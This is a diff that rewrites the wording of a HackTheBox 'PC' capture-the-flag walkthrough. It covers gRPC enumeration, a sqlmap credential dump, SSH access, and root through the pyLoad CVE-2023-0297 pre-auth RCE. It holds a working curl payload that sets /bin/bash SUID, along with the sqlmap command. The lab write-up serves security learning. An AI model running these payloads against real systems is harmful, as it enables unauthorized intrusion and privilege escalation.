@@ -5,7 +5,7 @@
 
 ## Enumeration:
 
-I began the enumeration with the quick Rsutscan on the target machine but I only got 2 ports open, 22 & 50051:
+I began the enumeration by performing a quick Rustscan on the target machine. However, I found only two open ports, 22 and 50051:
 
 ```bash
 sudo rustscan -a 10.10.11.214 -- -sC -sV -vv -oN pc_nmap
@@ -56,15 +56,15 @@ SF:\x08\0\0\0\0\0\0\?\0\0");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-I visited the webpage on port 50051 but I observed that it is runnig some kind of software other than web application:
+Upon visiting the webpage on port 50051, I noticed that it was running software other than a web application:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d4d910a-fa88-4dba-8cd9-038adb2ea9f9)
 
-I tried to connect to the port via netcat but the conection is getting dropped quickly after running any of the command:
+I attempted to connect to the port using Netcat, but the connection was quickly dropped after running any command:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6788ec89-3e99-49f0-bd09-338eee2ef52b)
 
-Then after multiple attempts to connect via port 50051 I searched for the port service running on 50051 & I found'gRPC' service is running on 50051.
+After multiple failed attempts to connect via port 50051, I researched the service running on that port and discovered that it was a gRPC service.
 
 ```
 gRPC is designed to work with a variety of authentication mechanisms, making it easy to safely use gRPC to talk to other systems. You can use our supported mechanisms - SSL/TLS with or without Google token-based authentication - or you can plug in your own authentication system by extending our provided code.
@@ -72,19 +72,19 @@ gRPC is designed to work with a variety of authentication mechanisms, making it 
 gRPC also provides a simple authentication API that lets you provide all the necessary authentication information as Credentials when creating a channel or making a call.
 ```
 
-I got this [blog](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) on medium where the full exploitation process of gRPC is explained.
+I came across this [blog](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) on Medium that explained the complete exploitation process of gRPC.
 
-So, I have to make connection on gRPC service & to perform the connection I downloaded 'grpccurl' from this [Github repo](https://github.com/fullstorydev/grpcurl/releases)
+To establish a connection with the gRPC service, I downloaded 'grpccurl' from this [Github repo](https://github.com/fullstorydev/grpcurl/releases):
 
 ```bash
 grpcurl -plaintext 10.10.11.214:50051 list
 ```
 
-I got 2 services listed:
+This listed two services:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2242e9ae-952c-4199-aea6-b7f75155869f)
 
-I decided to enumerate the SimpleApp service & listed it's modules:
+I decided to enumerate the SimpleApp service and list its modules:
 
 ```bash
 grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
@@ -92,46 +92,49 @@ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7939cc35-2ff8-4c63-9746-131b0ba911e1)
 
-I got 3 modules in the SimpleApp:
+This revealed three modules within SimpleApp:
+
 ```
 SimpleApp.LoginUser
 SimpleApp.RegisterUser
 SimpleApp.getInfo
 ```
 
-I enumerated all 3 services & it seems like I need to have an account/authentication token to use the service:
+I attempted to use all three services but realized that an account or authentication token was required to access them:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/53109ad4-d31b-4ac2-b1ce-93745658dbba)
 
-I downloaded grpcui that will initiate a UI portal on which we can provide our data to create or modify our blog. There are other operations also which we can use from this portal.
+To interact with the gRPC service and provide data for creating or modifying our blog, I downloaded grpcui, which opens a user interface portal:
 
 ```bash
 grpcui -plaintext 10.10.11.214:50051
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d7d2eeb9-a203-4eea-b52e-1a11828483cc)
 
-I got the UI page opened in my browser directly after running the command:
+This command opened the UI page directly in my browser:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2ba0c48b-5861-4fd5-ae5a-343559ad28c2)
+
+Overall, the enumeration process involved identifying the gRPC service on port 50051, exploring available services and modules, and utilizing tools like grpccurl and grpcui to interact with the service.
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ### Initial access:
 
-In the LoginUser portal I tried the default 'admin:admin' credentials & got successfully logged-in.
+I attempted to log in to the LoginUser portal using the default 'admin:admin' credentials and successfully gained access.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/269a897f-887b-4c5c-9c04-3481474a5246)
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/627a58bb-f7de-4444-b88c-5901bdd9e6a4)
 
-I got the token & ID of the administrator which I used it to get info:
+After logging in, I obtained the administrator's token and ID, which I used to retrieve additional information.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/02f99a8e-1b4d-458c-8c8d-544296765c42)
 
-I sent the request to Burp & save the request part:
+To capture the request, I sent it to Burp and saved the relevant part.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3f8f7236-0954-42d3-92a2-1348fe00d506)
 
-With the saved requested part I ran SQLmap to retrieve the more info from DB & finally got the user & password:
+Using the saved request, I ran SQLmap to extract more information from the database, successfully retrieving the user and password.
 
 ```bash
 sqlmap -r grpc.req --level=5 --risk=3 --batch --dbs --dump 
@@ -140,7 +143,7 @@ sqlmap -r grpc.req --level=5 --risk=3 --batch --dbs --dump
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2a31f627-cb8a-4ad5-affd-3da6539c1b6d)
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/38b2e9af-2709-406a-baac-555b5e9d059a)
 
-With the credentials dumped from the DB I tried to login via SSH & finally able to login successfully, where I got the user flag as well: (pwn3d!)
+With the credentials obtained from the database, I successfully logged in via SSH and obtained the user flag. (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7719660a-b032-49bc-999f-44a5ab1add2b)
 
@@ -148,46 +151,45 @@ With the credentials dumped from the DB I tried to login via SSH & finally able 
 
 ## Privilege Escalation:
 
-I started with manual enumeration & checked few things:
+I began with manual enumeration and checked a few things:
 
-  - I checked for the sudo permissions but it seems like 'Sau' can't run the sudo commands.
-  - I checked for SUID binaries but nothing helpful here as well.
-  - I ran linpeas but didn't found here anything as well.
+  - I verified the sudo permissions, but it appears that 'Sau' cannot run sudo commands.
+  - I examined SUID binaries, but found nothing helpful.
+  - I ran Linpeas but didn't find any relevant information.
 
-I then check for the running tcp connections & found a port 8000 listening for some services:
+Next, I checked for running TCP connections and discovered a service listening on port 8000:
 
 ```bash
 netstat -anot
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5226b513-6ea9-4853-8a45-aa8a520954b4)
 
-I performed port forwarding via SSH & opened the service on my host:
+I performed port forwarding via SSH and accessed the service on my local host:
 
 ```bash
 ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000 -N
 ```
 
-I found a service running 'pyload' on port 8000, pyLoad is an OSS download manager written in Python and manageable via web interface:
+I identified a service called 'pyload' running on port 8000. pyLoad is an open-source download manager written in Python and can be managed through a web interface:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e9ebf106-886c-4f46-9977-99856c48e912)
 
-I tried to bypass the login by performing SQL injection but it didn't worked.
+I attempted to bypass the login by performing an SQL injection, but it didn't work.
 
-Then I serached for the possible exploits on web & found this blog in [Github](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).
+Then, I searched for possible exploits online and came across a blog on GitHub: [CVE-2023-0297_Pre-auth_RCE_in_pyLoad](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).
 
-By following the blog & made some changes in POC by replacing & adding 'chmod u+s /bin/bash' in URL encoded format, I initiated a curl command.
+Following the instructions in the blog, I made some changes to the proof-of-concept (POC) by replacing and adding 'chmod u+s /bin/bash' in URL-encoded format. I initiated a curl command:
 
 ```bash
 curl -i -s -k -X 'POST' --data-binary 'jk=pyimport%20os;os.system("chmod%20u%2Bs%20%2Fbin%2Fbash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' 'http://127.0.0.1:8000/flash/addcrypted2'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f3af3112-1d6e-4dea-a855-c1c6cfd2c3f4)
 
-After performing the curl request I checked for the /bin/bash again & this time I observed the bash with the root privileges available. I then executed 'bash -p' to execute the root bash.
+After executing the curl request, I checked for /bin/bash again and observed that a root-level bash was available. I executed 'bash -p' to open the root bash shell:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0f98c828-e18b-473f-ba38-c459e9a1fb84)
 
-After getting the root bash I was finally able to fetch the root flag.(pwn3d! 🙂)
-
+With the root shell, I was able to retrieve the root flag. (pwn3d! 🙂)
 
 
 
